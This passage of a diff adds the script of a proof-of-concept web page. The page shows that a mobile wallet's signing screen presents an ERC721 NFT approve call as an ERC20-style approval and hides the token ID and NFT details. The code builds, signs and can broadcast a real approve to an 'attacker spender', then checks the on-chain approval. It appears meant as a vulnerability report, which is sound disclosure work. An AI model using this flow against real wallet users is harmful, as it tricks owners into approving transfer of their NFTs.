+    $('chainIdHex').value = decimalToHex(preset.chainId)
+    if (!$('nftContract').value.trim() || $('nftContract').value.trim() === ZERO_ADDRESS) {
+      $('nftContract').value = preset.defaultNft
+    }
+    if (!$('nftSymbol').value.trim() || $('nftSymbol').value.trim() === 'NFT') {
+      $('nftSymbol').value = preset.defaultSymbol
+    }
+    setupLauncher()
+    updateNftSidecar()
+    updatePreviewModel()
+  }
+
+  function updateChainHex() {
+    try {
+      $('chainIdHex').value = decimalToHex(assertUintField('chainId'))
+    } catch (_e) {
+      $('chainIdHex').value = ''
+    }
+  }
+
+  function buildTxPayload() {
+    const from = $('from').value.trim() || ZERO_ADDRESS
+    const to = assertAddress('nftContract')
+    const spender = assertAddress('spender')
+    const tokenId = assertUintField('tokenId')
+    const gas = $('gas').value.trim()
+    const gasPrice = $('gasPrice').value.trim()
+    const tx = {
+      from,
+      to,
+      value: '0x0',
+      data: encodeApprove(spender, tokenId),
+      chainId: decimalToHex(assertUintField('chainId')),
+      gas: gas ? assertUintField('gas') : undefined,
+      gasPrice: gasPrice ? assertUintField('gasPrice') : undefined,
+    }
+    Object.keys(tx).forEach((key) => tx[key] === undefined && delete tx[key])
+    return tx
+  }
+
+  function buildMockPreview(tx) {
+    const tokenId = assertUintField('tokenId')
+    const symbol = $('nftSymbol').value.trim() || 'NFT'
+    syncAutoNftName()
+    const nftName = $('nftName').value.trim() || `${symbol} #${tokenId}`
+    const imageUrl = $('nftImageUrl').value.trim() || localNftImageUrl()
+    const spender = decodeApproveData(tx.data)?.spender || $('spender').value.trim().toLowerCase()
+    const contract = normalizeHex(tx.to)
+    return {
+      addressInfos: {
+        [contract]: {
+          addressType: 'ERC721',
+          name: `${symbol} collection`,
+          logo: imageUrl,
+          addressExtraInfo: {
+            decimals: 0,
+            symbol,
+            tokenids: {
+              [tokenId]: {
+                name: nftName,
+                content_uri: imageUrl,
+              },
+            },
+          },
+        },
+        [spender.toLowerCase()]: {
+          addressType: 'EOA',
+          name: 'attacker spender',
+          logo: '',
+          addressExtraInfo: {
+            decimals: 0,
+            symbol: '',
+            tokenids: {},
+          },
+        },
+      },
+      tokenFlow: [],
+      signInfo: {
+        txType: 'APPROVAL',
+        humanReadableAbi: {
+          name: 'approve',
+          data: [
+            { name: 'method', type: 'function', value: 'approve(address,uint256)' },
+            { name: 'to', type: 'address', value: spender },
+            { name: 'tokenId', type: 'uint256', value: tokenId },
+          ],
+        },
+      },
+    }
+  }
+
+  function buildSignPreviewRequest(tx) {
+    return [
+      {
+        caip2: `eip155:${parseChainId(tx.chainId)}`,
+        signType: 'SignTransaction',
+        signData: {
+          from: tx.from,
+          to: tx.to,
+          value: tx.value,
+          data: tx.data,
+        },
+        context: {
+          source: 'dapp',
+          url: location.origin,
+          timestamp: Date.now(),
+        },
+      },
+    ]
+  }
+
+  function updatePreviewModel() {
+    const tx = buildTxPayload()
+    const decoded = decodeApproveData(tx.data)
+    const preview = buildMockPreview(tx)
+    state.payload = tx
+    state.preview = preview
+    $('payload').value = JSON.stringify({
+      ethSendTransaction: {
+        method: 'eth_sendTransaction',
+        params: [tx],
+      },
+      legacySignOnlyApi: {
+        apiName: 'ethereum.signTransaction',
+        payload: tx,
+      },
+      decodedCalldata: decoded,
+      modeledWalletClassification: {
+        signCase: 'Approve',
+        previewType: 'PreviewERC20Approve',
+        reason: 'ERC20 and ERC721 share approve(address,uint256) selector 0x095ea7b3',
+      },
+      signPreviewRequestModeledFromSource: buildSignPreviewRequest(tx),
+      mockPreviewFetch: {
+        endpoint: getMockPreviewEndpoint(),
+      },
+    }, null, 2)
+    $('preview').value = JSON.stringify(preview, null, 2)
+    $('selectorStatus').textContent = `${decoded.selector} = ERC20 approve(address,uint256) = ERC721 approve(address,uint256)`
+    $('branch').textContent = 'SignCase.Approve / PreviewERC20Approve'
+    $('visiblePreview').textContent =
+      `spender=${decoded.spender}；主授权行显示 ${$('nftSymbol').value.trim() || 'Unknown Token'} + ${formatCurrentApproveAmount(decoded.tokenId)}`
+    $('hiddenNft').textContent =
+      `缺失 tokenId=${decoded.tokenId}、${$('nftName').value.trim() || 'NFT item'}、NFT 图片/物品语义`
+    $('signedStatus').textContent =
+      `待签名 calldata 已是 ERC721 approve(spender=${decoded.spender}, tokenId=${decoded.tokenId})`
+    updateNftSidecar()
+    log('已构造 ERC721 approve payload，并建模当前源码的 ERC20 approve 预览', {
+      tx,
+      decoded,
+      preview,
+      expectedCurrentUi: {
+        route: 'PreviewERC20Approve',
+        visible: $('visiblePreview').textContent,
+        missing: $('hiddenNft').textContent,
+      },
+    })
+    return { tx, preview, decoded }
+  }
+
+  function formatCurrentApproveAmount(tokenId) {
+    return tokenId === '0' ? '0' : 'unknown'
+  }
+
+  function updateNftSidecar() {
+    const tokenId = $('tokenId').value.trim() || '0'
+    const symbol = $('nftSymbol').value.trim() || 'NFT'
+    syncAutoNftName()
+    const name = $('nftName').value.trim() || `${symbol} #${tokenId}`
+    const image = $('nftImageUrl').value.trim() || localNftImageUrl()
+    $('nftTokenIdText').textContent = tokenId
+    $('nftCollectionText').textContent = `${symbol} / ${$('nftContract').value.trim() || 'unknown'}`
+    $('nftNameText').textContent = name
+    $('nftImageText').textContent = image || '本地占位图'
+    if (image) $('nftImage').src = image
+  }
+
+  function updateOwnershipStatus() {
+    const from = $('from').value.trim().toLowerCase()
+    const owner = state.nftOwner
+    const approved = state.approved
+    const owns = !!owner && !!from && owner === from
+    $('ownershipStatus').textContent =
+      `supportsERC721=${state.supports721}; owner=${owner || 'unknown'}${owns ? ' (matches from)' : ''}; approved=${approved || 'unknown'}`
+    $('ownershipStatus').className = owns ? 'visible' : 'hidden'
+  }
+
+  async function requestMockPreview() {
+    const { tx } = updatePreviewModel()
+    const endpoint = getMockPreviewEndpoint()
+    if (!getMockBaseUrl() && isGithubPages()) {
+      throw new Error('GitHub Pages 是静态站，没有同源 /mock-wallet-sign-preview；请填写 mock 服务 base URL，或从本地服务 /dapp-link 打开页面')
+    }
+    log('请求 mock wallet.signPreview', { endpoint })
+    let response
+    try {
+      response = await fetch(endpoint, {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({
+          tx,
+          mockConfig: {
+            nftContract: $('nftContract').value.trim(),
+            tokenId: $('tokenId').value.trim(),
+            spender: $('spender').value.trim(),
+            nftSymbol: $('nftSymbol').value.trim(),
+            nftName: $('nftName').value.trim(),
+            nftImageUrl: $('nftImageUrl').value.trim(),
+          },
+        }),
+      })
+    } catch (e) {
+      throw new Error(`${e.message}；如果当前是 HTTPS 静态页且 mockBase 是 http:// 局域网地址，WebView 可能拦截混合内容，请改用本地服务页面或 HTTPS tunnel`)
+    }
+    const data = await response.json()
+    if (!response.ok) throw new Error(data.error || `HTTP ${response.status}`)
+    $('preview').value = JSON.stringify(data, null, 2)
+    log('mock wallet.signPreview 返回', { endpoint, data })
+  }
+
+  async function signTransactionOnly() {
+    if (!$('from').value.trim()) await connectWallet()
+    const { tx, decoded } = updatePreviewModel()
+    log('即将调用 ethereum.signTransaction。此路径只签名返回 raw tx，不广播', tx)
+    const signed = await callImToken('ethereum.signTransaction', tx, 90000)
+    state.signedRaw = typeof signed === 'string'
+      ? signed
+      : signed && (signed.sign || signed.raw || signed.rawTransaction || signed.signedTransaction) || ''
+    const rawDecoded = state.signedRaw ? decodeSignedTx(state.signedRaw) : null
+    const signedApprove = rawDecoded && rawDecoded.data ? decodeApproveData(rawDecoded.data) : null
+    const preserved =
+      !!signedApprove &&
+      signedApprove.spender === decoded.spender &&
+      signedApprove.tokenId === decoded.tokenId &&
+      rawDecoded.to.toLowerCase() === tx.to.toLowerCase()
+    $('txStatus').textContent = state.signedRaw
+      ? `signed raw tx: ${state.signedRaw.slice(0, 18)}...`
+      : 'signTransaction returned'
+    $('signedStatus').textContent = preserved
+      ? `已验证 raw tx 保留 NFT approve tokenId=${signedApprove.tokenId}`
+      : '签名返回未能解码或字段不匹配，请看回执'
+    $('receipt').value = JSON.stringify({ signed, rawDecoded, signedApprove, preserved }, null, 2)
+    log('signTransaction 返回；decoded calldata 可证明最终签名仍是 ERC721 approve', {
+      signed,
+      rawDecoded,
+      signedApprove,
+      preserved,
+    })
+  }
+
+  async function sendTransactionReal() {
+    if (!$('from').value.trim()) await connectWallet()
+    const { tx, decoded } = updatePreviewModel()
+    const from = $('from').value.trim().toLowerCase()
+    const owner = state.nftOwner
+    if (!$('broadcastAck').checked) {
+      throw new Error('请先勾选广播确认框')
+    }
+    if (owner && owner !== from) {
+      throw new Error(`ownerOf(tokenId)=${owner}，不是当前 from=${from}，广播会失败`)
+    }
+    const confirmText = [
+      '即将调用 eth_sendTransaction 并真实广播。',
+      `network chainId=${$('chainId').value.trim()}`,
+      `ERC721 contract=${tx.to}`,
+      `spender=${decoded.spender}`,
+      `tokenId=${decoded.tokenId}`,
+      '确认页如果只显示 ERC20-style approval amount，而没有清晰展示 NFT tokenId/图片/物品语义，即命中本报告。'
+    ].join('\n')
+    if (!window.confirm(confirmText)) {
+      log('用户取消 eth_sendTransaction')
+      return
+    }
+    const txHash = await requestEthereum('eth_sendTransaction', [tx], 120000)
+    $('txStatus').textContent = `broadcast txHash=${txHash}`
+    const receipt = { txHash, decodedCalldata: decoded }
+    try {
+      receipt.transaction = await requestEthereum('eth_getTransactionByHash', [txHash], 20000)
+    } catch (e) {
+      receipt.lookupError = e.message
+    }
+    try {
+      receipt.finalGetApproved = await waitForApproved(decoded.spender)
+    } catch (e) {
+      receipt.finalGetApprovedError = e.message
+    }
+    $('receipt').value = JSON.stringify(receipt, null, 2)
+    log('eth_sendTransaction 返回；getApproved(tokenId) 可作为链上授权证据', receipt)
+  }
+
+  async function waitForApproved(expectedSpender) {
+    let last = null
+    for (let i = 0; i < 12; i += 1) {
+      await new Promise((resolve) => setTimeout(resolve, i === 0 ? 1000 : 4000))
+      const result = await safeEthCall('getApproved', assertAddress('nftContract'), encodeGetApproved(assertUintField('tokenId')), decodeAddressResult)
+      last = result
+      if (result.ok) {
+        state.approved = result.value
+        updateOwnershipStatus()
+        if (result.value === expectedSpender) return result
+      }
+    }
+    return last
+  }
+
+  function updateFormDerived() {
+    updateChainHex()
+    setupLauncher()
+    updateNftSidecar()
+    try { updatePreviewModel() } catch (_e) {}
+  }
+
+  function defaultNftDisplayName(symbol, tokenId) {
+    return symbol === 'BAYC'
+      ? `Bored Ape Yacht Club #${tokenId}`
+      : `${symbol || 'NFT'} #${tokenId}`
+  }
+
+  function syncAutoNftName() {
+    const tokenId = $('tokenId').value.trim() || '0'
+    const symbol = $('nftSymbol').value.trim() || 'NFT'
+    const current = $('nftName').value.trim()
+    if (!state.nftNameTouched || !current || current === state.lastAutoNftName) {
+      const next = defaultNftDisplayName(symbol, tokenId)
+      $('nftName').value = next
+      state.lastAutoNftName = next
+    }
+  }
+
+  function bytesToHex(bytes) {
+    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0')).join('')
+  }
+
+  function hexToBytes(hex) {
+    const clean = strip0x(hex)
+    if (clean.length % 2 !== 0) throw new Error('invalid hex length')
+    const bytes = new Uint8Array(clean.length / 2)
+    for (let i = 0; i < clean.length; i += 2) bytes[i / 2] = parseInt(clean.slice(i, i + 2), 16)
+    return bytes
+  }
+
+  function readLength(bytes, offset, lengthOfLength) {
+    let length = 0
+    for (let i = 0; i < lengthOfLength; i += 1) length = (length * 256) + bytes[offset + i]
+    return length
+  }
+
+  function rlpDecodeAt(bytes, offset = 0) {
+    const prefix = bytes[offset]
+    if (prefix <= 0x7f) return { value: bytes.slice(offset, offset + 1), offset: offset + 1 }
+    if (prefix <= 0xb7) {
+      const length = prefix - 0x80
+      const start = offset + 1
+      return { value: bytes.slice(start, start + length), offset: start + length }
+    }
+    if (prefix <= 0xbf) {
+      const lengthOfLength = prefix - 0xb7
+      const length = readLength(bytes, offset + 1, lengthOfLength)
+      const start = offset + 1 + lengthOfLength
+      return { value: bytes.slice(start, start + length), offset: start + length }
+    }
+    if (prefix <= 0xf7) {
+      const length = prefix - 0xc0
+      const start = offset + 1
+      return decodeRlpList(bytes, start, start + length)
+    }
+    const lengthOfLength = prefix - 0xf7
+    const length = readLength(bytes, offset + 1, lengthOfLength)
+    const start = offset + 1 + lengthOfLength
+    return decodeRlpList(bytes, start, start + length)
+  }
+
+  function decodeRlpList(bytes, start, end) {
+    const list = []
+    let cursor = start
+    while (cursor < end) {
+      const decoded = rlpDecodeAt(bytes, cursor)
+      list.push(decoded.value)
+      cursor = decoded.offset
+    }
+    return { value: list, offset: end }
+  }
+
+  function rlpBytesToHex(value) {
+    if (!(value instanceof Uint8Array)) return ''
+    return value.length ? `0x${bytesToHex(value)}` : '0x'
+  }
+
+  function rlpBytesToDecimal(value) {
+    if (!(value instanceof Uint8Array) || value.length === 0) return '0'
+    return BigInt(`0x${bytesToHex(value)}`).toString(10)
+  }
+
+  function decodeSignedTx(rawTx) {
+    const bytes = hexToBytes(rawTx)
+    let type = 'legacy'
+    let body = bytes
+    if ((bytes[0] === 1 || bytes[0] === 2) && bytes[1] >= 0xc0) {
+      type = bytes[0] === 1 ? 'eip2930' : 'eip1559'
+      body = bytes.slice(1)
+    }
+    const decoded = rlpDecodeAt(body, 0).value
+    if (!Array.isArray(decoded)) throw new Error('signed tx is not an RLP list')
+    if (type === 'legacy') {
+      return {
+        type,
+        nonce: rlpBytesToDecimal(decoded[0]),
+        gasPrice: rlpBytesToDecimal(decoded[1]),
+        gasLimit: rlpBytesToDecimal(decoded[2]),
+        to: rlpBytesToHex(decoded[3]),
+        valueWei: rlpBytesToDecimal(decoded[4]),
+        data: rlpBytesToHex(decoded[5]),
+      }
+    }
+    if (type === 'eip2930') {
+      return {
+        type,
+        chainId: rlpBytesToDecimal(decoded[0]),
+        nonce: rlpBytesToDecimal(decoded[1]),
+        gasPrice: rlpBytesToDecimal(decoded[2]),
+        gasLimit: rlpBytesToDecimal(decoded[3]),
+        to: rlpBytesToHex(decoded[4]),
+        valueWei: rlpBytesToDecimal(decoded[5]),
+        data: rlpBytesToHex(decoded[6]),
+      }
+    }
+    return {
+      type,
+      chainId: rlpBytesToDecimal(decoded[0]),
+      nonce: rlpBytesToDecimal(decoded[1]),
+      maxPriorityFeePerGas: rlpBytesToDecimal(decoded[2]),
+      maxFeePerGas: rlpBytesToDecimal(decoded[3]),
+      gasLimit: rlpBytesToDecimal(decoded[4]),
+      to: rlpBytesToHex(decoded[5]),
+      valueWei: rlpBytesToDecimal(decoded[6]),
+      data: rlpBytesToHex(decoded[7]),
+    }
+  }
+
+  function bindEvents() {
+    $('sdkProbe').addEventListener('click', () => {
+      probeSdkCallback().catch((e) => log('SDK 回调探测失败', { message: e.message, environment: environmentInfo() }))
+    })
+    $('connect').addEventListener('click', () => {
+      connectWallet().catch((e) => log('连接账户失败', { message: e.message, environment: environmentInfo() }))
+    })
+    $('switchChain').addEventListener('click', () => {
+      switchToPresetChain().catch((e) => log('切链失败', { message: e.message, environment: environmentInfo() }))
+    })
+    $('probeNft').addEventListener('click', () => {
+      probeNftState().catch((e) => log('读取 NFT 状态失败', { message: e.message }))
+    })
+    $('build').addEventListener('click', () => {
+      try { updatePreviewModel() } catch (e) { log('构造 payload 失败', { message: e.message }) }
+    })
+    $('mockPreview').addEventListener('click', () => {
+      requestMockPreview().catch((e) => log('请求本地 mock wallet.signPreview 失败', { message: e.message }))
+    })
+    $('signOnly').addEventListener('click', () => {
+      signTransactionOnly().catch((e) => {
+        $('txStatus').textContent = `sign-only failed: ${e.message}`
+        log('signTransaction 失败', { message: e.message, environment: environmentInfo() })
+      })
+    })
+    $('sendTx').addEventListener('click', () => {
+      sendTransactionReal().catch((e) => {
+        $('txStatus').textContent = `broadcast failed: ${e.message}`
+        log('eth_sendTransaction 失败', { message: e.message, environment: environmentInfo() })
+      })
+    })
+    $('checkApproved').addEventListener('click', () => {
+      checkApproved().catch((e) => log('getApproved 查询失败', { message: e.message }))
+    })
+    $('preset').addEventListener('change', applyPreset)
+    ;[
+      'chainId',
+      'from',
+      'nftContract',
+      'tokenId',
+      'spender',
+      'nftSymbol',
+      'nftName',
+      'nftImageUrl',
+      'gas',
+      'gasPrice',
+      'mockBaseUrl',
+    ].forEach((id) => $(id).addEventListener('input', () => {
+      if (id === 'nftName') state.nftNameTouched = true
+      updateFormDerived()
+    }))
+  }
+
+  setupQueryDefaults()
+  bindEvents()
+  applyPreset()
+  setupLauncher()
+  refreshEnvironment()
+  updateOwnershipStatus()
+  log('PoC ready。先通过本地服务 /dapp-link 打开 imToken DAppView，再连接账户。', environmentInfo())
+</script>
+</body>
+</html>
